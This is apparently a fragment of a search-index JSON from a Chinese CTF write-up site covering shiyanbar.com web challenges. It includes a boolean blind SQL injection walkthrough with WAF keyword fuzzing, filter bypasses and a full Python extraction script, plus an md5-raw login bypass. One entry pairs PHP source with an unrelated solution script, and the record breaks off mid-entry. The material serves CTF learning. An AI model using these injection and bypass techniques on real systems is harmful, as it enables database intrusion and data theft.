            "text": "认真一点吧\n\n\n题目\n\n\n\n\nhttp://ctf5.shiyanbar.com/web/earnest/index.php \n\n\nPlease input the id\n\n\n\n\n\n分类：\nsql injection\n \n布尔盲注\n \nwaf过滤\n\n\n流程图\n\n\n解题步骤\n\n\n参考文章\n\n\n无\n\n\n步骤\n\n\n\n\n在文本框输入\n1\n，提交，查询到结果，返回\n\n\n\n\n\n\nYou are in ................ \n\n\n\n\n\n\n在文本框输入\n2\n，提交，未查询到\n\n\n\n\n\n\nYou are not in ............... \n\n\n\n\n\n\n在文件框输入\n1t\n，提交，返回\n\n\n\n\n\n\nYou are  in ............... \n\n\n\n\n这个时候并不能证明是那种注入，PHP可能进行了弱类型转换，也可能使用了\nintval\n来将字符串强制转换成了数值\n\n\n提交\n1'\n，返回\n\n\n\n\nYou are not in ............... \n\n\n\n\n说明\n'\n没被过滤掉，被带入到了sql查询中；可以证明后台并没有使用intval来进行强制转换，同时，结合\n1t\n被弱类型转换，或者被过滤的事实，说明这里是字符型注入，而不是数字型注入\n\n\n\n\n测试\n1' and 1=1\n，返回\n\n\n\n\n\n\nSql injection detected!\n\n\n\n\n说明存在waf的关键词过滤\n\n\n\n\n使用bp fuzz一下\n\n\n\n\n\n\nRequest    Payload Length\n3  substr  802\n4  sleep   802\n7  union   802\n10 and 802\n13 ||  802\n14 group by    802\n15 order by    802\n16 into outfile    802\n18 into dumpfile   802\n26 rand    802\n34 #   802\n36 %   802\n37 ^   802\n51 |   802\n53 ;   802\n59 ,   802\n0      908\n1  for 911\n2  to  911\n5  ExtractValue    911\n6  select  911\n8  concat  911\n9  or  911\n11 limit   911\n12 \n  911\n17 into    911\n19 having  911\n20 where   911\n21 insert  911\n22 update  911\n23 delete  911\n24 updatexml   911\n25 if  911\n27 from    911\n28 information_schema  911\n29 mid 911\n30 ord 911\n31 ~   911\n32 !   911\n33 @   911\n35 $   911\n38 \n   911\n39 *   911\n40 (   911\n41 )   911\n42 _   911\n43 +   911\n44 -   911\n45 =   911\n46 [   911\n47 ]   911\n48 {   911\n49 }   911\n50 \\   911\n52 :   911\n54 \"   911\n55 '   911\n56 \n   911\n57 \n   911\n58 ?   911\n60 .   911\n61 /   911\n62 `   911\n\n\n\n\n长度802的关键词被检测出，而其他的则未被检测到\n\n\n\n\n在文本框输入\n1' or '\n，提交，发现被检测到，貌似在几个关键词组合出现的时候，就会被检测到\n\n\n\n\n使用\noorr\n或者\nOz\n，并使用\n%09-%0d\n中的任一字符代替掉空格，就可以绕过，语句为\n1'%09oorr%09'\n\n\n返回结果为\n\n\n\n\nYou are  in ............... \n\n\n\n\n\n\n\n\n\n\ninformation什么倒是都没禁掉，但是注意information中包含or，需要替换掉。写一个二分盲注脚本即可，具体用到limit的offset偏移。然后它禁掉了substr，但是我们还有mid，用mid(table from offset)即可 \n\n\n\n\n\n\n\n\n写python脚本，布尔正则盲注爆破\n\n\n```python\n   # -\n- coding:utf8 -\n-\n   \nauthor\n='pcat@chamd5.org'\n\n\nimport requests\n   import string\n   import time\n\n\ndef payload(rawstr):\n       newstr=rawstr.replace(' ',chr(0x0a)).replace('or','oorr')\n       return newstr\n\n\ndef foo():\n       url=r'http://ctf5.shiyanbar.com/web/earnest/index.php'\n       mys=requests.session()\n       cset=string.digits+string.lowercase+'!_{}@~.'\n       true_state='You are in'\n\n\n   lens=0\n   i=1\n   model=\"0' or length(database())=%d or 'pcat'='\"\n   while True:\n       tmp= model %(i)\n       myd={'id':payload(tmp),}\n       res=mys.post(url,data=myd).content\n       if true_state in res:\n           lens=i\n           break\n       i+=1\n       pass\n   lens=18\n   print(\"[+]length(database()): %d\" %(lens))\n\n   strs=''\n   model=\"0' or (select database() regexp '%s$') or 'pcat'='\"\n   for i in range(lens):\n       for c in cset:\n           tmp=model %(c+strs)\n           myd={'id':payload(tmp),}\n           res=mys.post(url,data=myd).content\n           if true_state in res:\n               strs=c+strs\n               print strs\n               break\n       pass\n   pass\n   strs='ctf_sql_bool_blind'\n   print(\"[+]database():%s\" %(strs))\n\n\n   lens=0\n   i=1\n   model=\"0' or length(user())=%d or 'pcat'='\"\n   while True:\n       tmp= model %(i)\n       myd={'id':payload(tmp),}\n       res=mys.post(url,data=myd).content\n       if true_state in res:\n           lens=i\n           break\n       i+=1\n       pass\n   lens=14\n   print(\"[+]length(user()): %d\" %(lens))\n\n   strs=''\n   model=\"0' or (select user() regexp '%s$') or 'pcat'='\"\n   for i in range(lens):\n       for c in cset:\n           tmp=model %(c+strs)\n           myd={'id':payload(tmp),}\n           res=mys.post(url,data=myd).content\n           if true_state in res:\n               strs=c+strs\n               print strs\n               break\n       pass\n   pass\n   strs='web7@localhost'\n   print(\"[+]user():%s\" %(strs))\n\n\n\n   lens=0\n   i=1\n   model=\"0' or length((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database() limit 1))=%d or 'pcat'='\"\n   while True:\n       tmp= model %(i)\n       myd={'id':payload(tmp),}\n       res=mys.post(url,data=myd).content\n       if true_state in res:\n           lens=i\n           break\n       i+=1\n       pass\n   lens=10\n   print(\"[+]length(group_concat(table_name separator '@')): %d\" %(lens))\n\n   strs=''\n   model=\"0' or (select (select group_concat(table_name separator '@') from information_schema.tables where table_schema=database() limit 1) regexp '%s$') or 'pcat'='\"\n   for i in range(lens):\n       for c in cset:\n           tmp=model %(c+strs)\n           myd={'id':payload(tmp),}\n           res=mys.post(url,data=myd).content\n           if true_state in res:\n               strs=c+strs\n               print strs\n               break\n       pass\n   pass\n   strs='fiag@users'\n   print(\"[+]group_concat(table_name separator '@'):%s\" %(strs))\n\n\n   lens=0\n   i=1\n   model=\"0' or length((select group_concat(column_name separator '@') from information_schema.columns where table_name='fiag' limit 1))=%d or 'pcat'='\"\n   while True:\n       tmp= model %(i)\n       myd={'id':payload(tmp),}\n       res=mys.post(url,data=myd).content\n       if true_state in res:\n           lens=i\n           break\n       i+=1\n       pass\n   lens=5\n   print(\"[+]length(group_concat(column_name separator '@')): %d\" %(lens))\n\n   strs=''\n   model=\"0' or (select (select group_concat(column_name separator '@') from information_schema.columns where table_name='fiag' limit 1) regexp '%s$') or 'pcat'='\"\n   for i in range(lens):\n       for c in cset:\n           tmp=model %(c+strs)\n           myd={'id':payload(tmp),}\n           res=mys.post(url,data=myd).content\n           if true_state in res:\n               strs=c+strs\n               print strs\n               break\n       pass\n   pass\n   # get fl.4g maybe is fl.4g or f1$4g\n   strs='fl$4g'\n   print(\"[+]group_concat(column_name separator '@'):%s\" %(strs))\n\n\n   lens=0\n   i=1\n   model=\"0' or length((select fl$4g from fiag limit 1))=%d or 'pcat'='\"\n   while True:\n       tmp= model %(i)\n       myd={'id':payload(tmp),}\n       res=mys.post(url,data=myd).content\n       if true_state in res:\n           lens=i\n           break\n       i+=1\n       pass\n   lens=19\n   print(\"[+]length(fl$4g): %d\" %(lens))\n\n   strs=''\n   model=\"0' or (select (select fl$4g from fiag limit 1) regexp '%s$') or 'pcat'='\"\n   for i in range(lens):\n       for c in cset:\n           tmp=model %(c+strs)\n           myd={'id':payload(tmp),}\n           res=mys.post(url,data=myd).content\n           if true_state in res:\n               strs=c+strs\n               print strs\n               break\n       pass\n   pass\n   # get flag{haha~you.win!}\n   strs='flag{haha~you win!}'\n   print(\"[+]fl$4g:%s\" %(strs))\n   pass\n\n\n\nif \nname\n == '\nmain\n':\n       foo()\n       print 'ok'\n\n\n```\n\n\n解答思路\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n设定题目难度等级\nlevel\n为\n\n\n\n\n提交相应符合要求的字符串", 
            "title": "认真一点吧"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/#_1", 
            "text": "", 
            "title": "认真一点吧"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/#_2", 
            "text": "http://ctf5.shiyanbar.com/web/earnest/index.php   Please input the id   分类： sql injection   布尔盲注   waf过滤", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/#_3", 
            "text": "", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/#_4", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/#_5", 
            "text": "无", 
            "title": "参考文章"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/#_6", 
            "text": "在文本框输入 1 ，提交，查询到结果，返回    You are in ................     在文本框输入 2 ，提交，未查询到    You are not in ...............     在文件框输入 1t ，提交，返回    You are  in ...............    这个时候并不能证明是那种注入，PHP可能进行了弱类型转换，也可能使用了 intval 来将字符串强制转换成了数值  提交 1' ，返回   You are not in ...............    说明 ' 没被过滤掉，被带入到了sql查询中；可以证明后台并没有使用intval来进行强制转换，同时，结合 1t 被弱类型转换，或者被过滤的事实，说明这里是字符型注入，而不是数字型注入   测试 1' and 1=1 ，返回", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/#sql-injection-detected", 
            "text": "说明存在waf的关键词过滤   使用bp fuzz一下    Request    Payload Length\n3  substr  802\n4  sleep   802\n7  union   802\n10 and 802\n13 ||  802\n14 group by    802\n15 order by    802\n16 into outfile    802\n18 into dumpfile   802\n26 rand    802\n34 #   802\n36 %   802\n37 ^   802\n51 |   802\n53 ;   802\n59 ,   802\n0      908\n1  for 911\n2  to  911\n5  ExtractValue    911\n6  select  911\n8  concat  911\n9  or  911\n11 limit   911\n12    911\n17 into    911\n19 having  911\n20 where   911\n21 insert  911\n22 update  911\n23 delete  911\n24 updatexml   911\n25 if  911\n27 from    911\n28 information_schema  911\n29 mid 911\n30 ord 911\n31 ~   911\n32 !   911\n33 @   911\n35 $   911\n38     911\n39 *   911\n40 (   911\n41 )   911\n42 _   911\n43 +   911\n44 -   911\n45 =   911\n46 [   911\n47 ]   911\n48 {   911\n49 }   911\n50 \\   911\n52 :   911\n54 \"   911\n55 '   911\n56     911\n57     911\n58 ?   911\n60 .   911\n61 /   911\n62 `   911   长度802的关键词被检测出，而其他的则未被检测到   在文本框输入 1' or ' ，提交，发现被检测到，貌似在几个关键词组合出现的时候，就会被检测到   使用 oorr 或者 Oz ，并使用 %09-%0d 中的任一字符代替掉空格，就可以绕过，语句为 1'%09oorr%09'  返回结果为   You are  in ...............       information什么倒是都没禁掉，但是注意information中包含or，需要替换掉。写一个二分盲注脚本即可，具体用到limit的offset偏移。然后它禁掉了substr，但是我们还有mid，用mid(table from offset)即可      写python脚本，布尔正则盲注爆破  ```python\n   # - - coding:utf8 - -\n    author ='pcat@chamd5.org'  import requests\n   import string\n   import time  def payload(rawstr):\n       newstr=rawstr.replace(' ',chr(0x0a)).replace('or','oorr')\n       return newstr  def foo():\n       url=r'http://ctf5.shiyanbar.com/web/earnest/index.php'\n       mys=requests.session()\n       cset=string.digits+string.lowercase+'!_{}@~.'\n       true_state='You are in'     lens=0\n   i=1\n   model=\"0' or length(database())=%d or 'pcat'='\"\n   while True:\n       tmp= model %(i)\n       myd={'id':payload(tmp),}\n       res=mys.post(url,data=myd).content\n       if true_state in res:\n           lens=i\n           break\n       i+=1\n       pass\n   lens=18\n   print(\"[+]length(database()): %d\" %(lens))\n\n   strs=''\n   model=\"0' or (select database() regexp '%s$') or 'pcat'='\"\n   for i in range(lens):\n       for c in cset:\n           tmp=model %(c+strs)\n           myd={'id':payload(tmp),}\n           res=mys.post(url,data=myd).content\n           if true_state in res:\n               strs=c+strs\n               print strs\n               break\n       pass\n   pass\n   strs='ctf_sql_bool_blind'\n   print(\"[+]database():%s\" %(strs))\n\n\n   lens=0\n   i=1\n   model=\"0' or length(user())=%d or 'pcat'='\"\n   while True:\n       tmp= model %(i)\n       myd={'id':payload(tmp),}\n       res=mys.post(url,data=myd).content\n       if true_state in res:\n           lens=i\n           break\n       i+=1\n       pass\n   lens=14\n   print(\"[+]length(user()): %d\" %(lens))\n\n   strs=''\n   model=\"0' or (select user() regexp '%s$') or 'pcat'='\"\n   for i in range(lens):\n       for c in cset:\n           tmp=model %(c+strs)\n           myd={'id':payload(tmp),}\n           res=mys.post(url,data=myd).content\n           if true_state in res:\n               strs=c+strs\n               print strs\n               break\n       pass\n   pass\n   strs='web7@localhost'\n   print(\"[+]user():%s\" %(strs))\n\n\n\n   lens=0\n   i=1\n   model=\"0' or length((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database() limit 1))=%d or 'pcat'='\"\n   while True:\n       tmp= model %(i)\n       myd={'id':payload(tmp),}\n       res=mys.post(url,data=myd).content\n       if true_state in res:\n           lens=i\n           break\n       i+=1\n       pass\n   lens=10\n   print(\"[+]length(group_concat(table_name separator '@')): %d\" %(lens))\n\n   strs=''\n   model=\"0' or (select (select group_concat(table_name separator '@') from information_schema.tables where table_schema=database() limit 1) regexp '%s$') or 'pcat'='\"\n   for i in range(lens):\n       for c in cset:\n           tmp=model %(c+strs)\n           myd={'id':payload(tmp),}\n           res=mys.post(url,data=myd).content\n           if true_state in res:\n               strs=c+strs\n               print strs\n               break\n       pass\n   pass\n   strs='fiag@users'\n   print(\"[+]group_concat(table_name separator '@'):%s\" %(strs))\n\n\n   lens=0\n   i=1\n   model=\"0' or length((select group_concat(column_name separator '@') from information_schema.columns where table_name='fiag' limit 1))=%d or 'pcat'='\"\n   while True:\n       tmp= model %(i)\n       myd={'id':payload(tmp),}\n       res=mys.post(url,data=myd).content\n       if true_state in res:\n           lens=i\n           break\n       i+=1\n       pass\n   lens=5\n   print(\"[+]length(group_concat(column_name separator '@')): %d\" %(lens))\n\n   strs=''\n   model=\"0' or (select (select group_concat(column_name separator '@') from information_schema.columns where table_name='fiag' limit 1) regexp '%s$') or 'pcat'='\"\n   for i in range(lens):\n       for c in cset:\n           tmp=model %(c+strs)\n           myd={'id':payload(tmp),}\n           res=mys.post(url,data=myd).content\n           if true_state in res:\n               strs=c+strs\n               print strs\n               break\n       pass\n   pass\n   # get fl.4g maybe is fl.4g or f1$4g\n   strs='fl$4g'\n   print(\"[+]group_concat(column_name separator '@'):%s\" %(strs))\n\n\n   lens=0\n   i=1\n   model=\"0' or length((select fl$4g from fiag limit 1))=%d or 'pcat'='\"\n   while True:\n       tmp= model %(i)\n       myd={'id':payload(tmp),}\n       res=mys.post(url,data=myd).content\n       if true_state in res:\n           lens=i\n           break\n       i+=1\n       pass\n   lens=19\n   print(\"[+]length(fl$4g): %d\" %(lens))\n\n   strs=''\n   model=\"0' or (select (select fl$4g from fiag limit 1) regexp '%s$') or 'pcat'='\"\n   for i in range(lens):\n       for c in cset:\n           tmp=model %(c+strs)\n           myd={'id':payload(tmp),}\n           res=mys.post(url,data=myd).content\n           if true_state in res:\n               strs=c+strs\n               print strs\n               break\n       pass\n   pass\n   # get flag{haha~you.win!}\n   strs='flag{haha~you win!}'\n   print(\"[+]fl$4g:%s\" %(strs))\n   pass  if  name  == ' main ':\n       foo()\n       print 'ok'  ```", 
            "title": "Sql injection detected!"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/#_7", 
            "text": "", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/#_8", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_be_serious/#_9", 
            "text": "TODO    设定题目难度等级 level 为   提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/", 
            "text": "Forms（待wp）\n\n\n题目\n\n\n\n\nhttp://ctf5.shiyanbar.com/10/main.php \n \n\n\n似乎有人觉得PIN码是不可破解的，让我们证明他是错的。\n\n\n格式：ctf{}\n\n\n\n\n题目类型：PHP审查\n\n\n流程图\n\n\n解题步骤\n\n\n参考文章\n\n\n步骤\n\n\n0x1\n\n\n\n\n\n\n\n​   \n\n\n0x2\n\n\n\n\n\n\n\n解答思路\n\n\n\n\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO", 
            "title": "Forms（待wp）"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#formswp", 
            "text": "", 
            "title": "Forms（待wp）"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#_1", 
            "text": "http://ctf5.shiyanbar.com/10/main.php     似乎有人觉得PIN码是不可破解的，让我们证明他是错的。  格式：ctf{}   题目类型：PHP审查", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#_2", 
            "text": "", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#_3", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#_4", 
            "text": "", 
            "title": "参考文章"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#_5", 
            "text": "", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#0x1", 
            "text": "​", 
            "title": "0x1"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#0x2", 
            "text": "", 
            "title": "0x2"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#_6", 
            "text": "", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#_7", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_forms/#_8", 
            "text": "TODO", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/", 
            "text": "拐弯抹角\n\n\n题目\n\n\n\n\nhttp://ctf5.shiyanbar.com/indirection/ \n \n\n\n如何欺骗服务器，才能拿到Flag？\n\n\n格式：CTF{}\n\n\n\n\n题目类型：PHP审查\n\n\n流程图\n\n\n解题步骤\n\n\n参考文章\n\n\n步骤\n\n\n0x1 查看PHP代码\n\n\nFlag:\n\n?php \n// code by SEC@USTC \n\necho '\nhtml\nhead\nmeta http-equiv=\ncharset\n content=\ngbk\n/head\nbody\n'; \n\n$URL = $_SERVER['REQUEST_URI']; \n//echo 'URL: '.$URL.'\nbr/\n'; \n$flag = \nCTF{???}\n; \n\n$code = str_replace($flag, 'CTF{???}', file_get_contents('./index.php')); \n$stop = 0; \n\n//这道题目本身也有教学的目的 \n//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的 \n//所以，第一个要求就是不得出现 ./ \nif($flag \n strpos($URL, './') !== FALSE){ \n    $flag = \n; \n    $stop = 1;        //Pass \n} \n\n//第二，我们可以构造 \\ 来代替被过滤的 / \n//所以，第二个要求就是不得出现 ../ \nif($flag \n strpos($URL, '\\\\') !== FALSE){ \n    $flag = \n; \n    $stop = 2;        //Pass \n} \n\n//第三，有的系统大小写通用，例如 indirectioN/ \n//你也可以用?和#等等的字符绕过，这需要统一解决 \n//所以，第三个要求对可以用的字符做了限制，a-z / 和 . \n$matches = array(); \npreg_match('/^([0-9a-z\\/.]+)$/', $URL, $matches); \nif($flag \n empty($matches) || $matches[1] != $URL){ \n    $flag = \n; \n    $stop = 3;        //Pass \n} \n\n//第四，多个 / 也是可以的 \n//所以，第四个要求是不得出现 // \nif($flag \n strpos($URL, '//') !== FALSE){ \n    $flag = \n; \n    $stop = 4;        //Pass \n} \n\n//第五，显然加上index.php或者减去index.php都是可以的 \n//所以我们下一个要求就是必须包含/index.php，并且以此结尾 \nif($flag \n substr($URL, -10) !== '/index.php'){ \n    $flag = \n; \n    $stop = 5;        //Not Pass \n} \n\n//第六，我们知道在index.php后面加.也是可以的 \n//所以我们禁止p后面出现.这个符号 \nif($flag \n strpos($URL, 'p.') !== FALSE){ \n    $flag = \n; \n    $stop = 6;        //Not Pass \n} \n\n//第七，现在是最关键的时刻 \n//你的$URL必须与/indirection/index.php有所不同 \nif($flag \n $URL == '/indirection/index.php'){ \n    $flag = \n; \n    $stop = 7;        //Not Pass \n} \nif(!$stop) $stop = 8; \n\necho 'Flag: '.$flag; \necho '\nhr /\n'; \nfor($i = 1; $i \n $stop; $i++) \n    $code = str_replace('//Pass '.$i, '//Pass', $code); \nfor(; $i \n 8; $i++) \n    $code = str_replace('//Pass '.$i, '//Not Pass', $code); \n\n\necho highlight_string($code, TRUE); \n\necho '\n/body\n/html\n';\n\n\n\n\n​   发现了flag\n\n\n\n\n响应体\n\n\n\n\n```html\n\n\nThere is no martial art is indefectible, while the fastest speed is the only way for long success.\n----You must do it as fast as you can!----\n\n   \n\n   ```\n\n\n发现提到，使用参数key来提交\n\n\n0x2 pytho提交\n\n\nimport urllib2\nimport urllib\nimport base64\nurl = r'http://ctf5.shiyanbar.com/web/10/10.php'\n\n\nresponse = urllib2.urlopen(url)\nflag = response.info().getheader('FLAG')\nflag = base64.b64decode(flag)\nflag = flag.split(':')[1]\n\npostdata = urllib.urlencode({'key':flag})\nrequest = urllib2.Request(url,data = postdata)\nresponse = urllib2.urlopen(request)\nprint response.read()\n\n\n\n\n解答思路\n\n\n\n\n全面查看请求得到的信息\n\n\n使用python按照要求提交\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5\n \n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "拐弯抹角"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#_1", 
            "text": "", 
            "title": "拐弯抹角"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#_2", 
            "text": "http://ctf5.shiyanbar.com/indirection/     如何欺骗服务器，才能拿到Flag？  格式：CTF{}   题目类型：PHP审查", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#_3", 
            "text": "", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#_4", 
            "text": "", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#_5", 
            "text": "", 
            "title": "参考文章"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#_6", 
            "text": "", 
            "title": "步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#0x1-php", 
            "text": "Flag: ?php \n// code by SEC@USTC \n\necho ' html head meta http-equiv= charset  content= gbk /head body '; \n\n$URL = $_SERVER['REQUEST_URI']; \n//echo 'URL: '.$URL.' br/ '; \n$flag =  CTF{???} ; \n\n$code = str_replace($flag, 'CTF{???}', file_get_contents('./index.php')); \n$stop = 0; \n\n//这道题目本身也有教学的目的 \n//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的 \n//所以，第一个要求就是不得出现 ./ \nif($flag   strpos($URL, './') !== FALSE){ \n    $flag =  ; \n    $stop = 1;        //Pass \n} \n\n//第二，我们可以构造 \\ 来代替被过滤的 / \n//所以，第二个要求就是不得出现 ../ \nif($flag   strpos($URL, '\\\\') !== FALSE){ \n    $flag =  ; \n    $stop = 2;        //Pass \n} \n\n//第三，有的系统大小写通用，例如 indirectioN/ \n//你也可以用?和#等等的字符绕过，这需要统一解决 \n//所以，第三个要求对可以用的字符做了限制，a-z / 和 . \n$matches = array(); \npreg_match('/^([0-9a-z\\/.]+)$/', $URL, $matches); \nif($flag   empty($matches) || $matches[1] != $URL){ \n    $flag =  ; \n    $stop = 3;        //Pass \n} \n\n//第四，多个 / 也是可以的 \n//所以，第四个要求是不得出现 // \nif($flag   strpos($URL, '//') !== FALSE){ \n    $flag =  ; \n    $stop = 4;        //Pass \n} \n\n//第五，显然加上index.php或者减去index.php都是可以的 \n//所以我们下一个要求就是必须包含/index.php，并且以此结尾 \nif($flag   substr($URL, -10) !== '/index.php'){ \n    $flag =  ; \n    $stop = 5;        //Not Pass \n} \n\n//第六，我们知道在index.php后面加.也是可以的 \n//所以我们禁止p后面出现.这个符号 \nif($flag   strpos($URL, 'p.') !== FALSE){ \n    $flag =  ; \n    $stop = 6;        //Not Pass \n} \n\n//第七，现在是最关键的时刻 \n//你的$URL必须与/indirection/index.php有所不同 \nif($flag   $URL == '/indirection/index.php'){ \n    $flag =  ; \n    $stop = 7;        //Not Pass \n} \nif(!$stop) $stop = 8; \n\necho 'Flag: '.$flag; \necho ' hr / '; \nfor($i = 1; $i   $stop; $i++) \n    $code = str_replace('//Pass '.$i, '//Pass', $code); \nfor(; $i   8; $i++) \n    $code = str_replace('//Pass '.$i, '//Not Pass', $code); \n\n\necho highlight_string($code, TRUE); \n\necho ' /body /html ';  ​   发现了flag   响应体   ```html  There is no martial art is indefectible, while the fastest speed is the only way for long success. ----You must do it as fast as you can!---- \n    \n   ```  发现提到，使用参数key来提交", 
            "title": "0x1 查看PHP代码"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#0x2-pytho", 
            "text": "import urllib2\nimport urllib\nimport base64\nurl = r'http://ctf5.shiyanbar.com/web/10/10.php'\n\n\nresponse = urllib2.urlopen(url)\nflag = response.info().getheader('FLAG')\nflag = base64.b64decode(flag)\nflag = flag.split(':')[1]\n\npostdata = urllib.urlencode({'key':flag})\nrequest = urllib2.Request(url,data = postdata)\nresponse = urllib2.urlopen(request)\nprint response.read()", 
            "title": "0x2 pytho提交"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#_7", 
            "text": "全面查看请求得到的信息  使用python按照要求提交", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#_8", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_guaiwanmojiao/#_9", 
            "text": "TODO    判断题目特征： web   php   md5     设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_houtaidenglu/", 
            "text": "后台登录\n\n\n题目\n\n\n\n\nhttp://ctf5.shiyanbar.com/web/houtai/ffifdyop.php\n\n\n请用管理员密码进行登录~~\n\n\n\n\n解答思路\n\n\n\n\n\n\n从页面收集的信息需要尝试直接提交\n\n\n\n\n\n\n此题目在源代码中给出了php代码，但其实是干扰项，为了防止入坑，需要优先提交收集到的信息\n\n\n\n\n\n\n```php+HTML\n\n\n!DOCTYPE html\n\n  \n?php\n     $password=$_POST['password'];\n    $sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\";\n    $result=mysqli_query($link,$sql);\n        if(mysqli_num_rows($result)\n0){\n            echo 'flag is :'.$flag;\n        }\n        else{\n            echo '密码错误!';\n        } \n  ?\n\n  ```\n\n\n流程图\n\n\ngraph LR\nA[收集信息] --\n B{是否收集到?}\nB --\n |是| D[存入数据库]\nD --\n E[尝试直接提交参数]\nE --\n F{是否得到了flag}\nF --\n |是| H[提交flag]\nF --\n |否| A\nB --\n |否| A\n\n\n\n\n解题步骤\n\n\n\n\n获取url的php页面名称\nffifdyop\n，提交\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5\n \n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "后台登录"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_houtaidenglu/#_1", 
            "text": "", 
            "title": "后台登录"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_houtaidenglu/#_2", 
            "text": "http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php  请用管理员密码进行登录~~", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_houtaidenglu/#_3", 
            "text": "从页面收集的信息需要尝试直接提交    此题目在源代码中给出了php代码，但其实是干扰项，为了防止入坑，需要优先提交收集到的信息    ```php+HTML  !DOCTYPE html \n   ?php\n     $password=$_POST['password'];\n    $sql = \"SELECT * FROM admin WHERE username = 'admin' and password = '\".md5($password,true).\"'\";\n    $result=mysqli_query($link,$sql);\n        if(mysqli_num_rows($result) 0){\n            echo 'flag is :'.$flag;\n        }\n        else{\n            echo '密码错误!';\n        } \n  ? \n  ```", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_houtaidenglu/#_4", 
            "text": "graph LR\nA[收集信息] --  B{是否收集到?}\nB --  |是| D[存入数据库]\nD --  E[尝试直接提交参数]\nE --  F{是否得到了flag}\nF --  |是| H[提交flag]\nF --  |否| A\nB --  |否| A", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_houtaidenglu/#_5", 
            "text": "获取url的php页面名称 ffifdyop ，提交", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_houtaidenglu/#_6", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_houtaidenglu/#_7", 
            "text": "TODO    判断题目特征： web   php   md5     设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[shiyanbar.com]_post_fast/", 
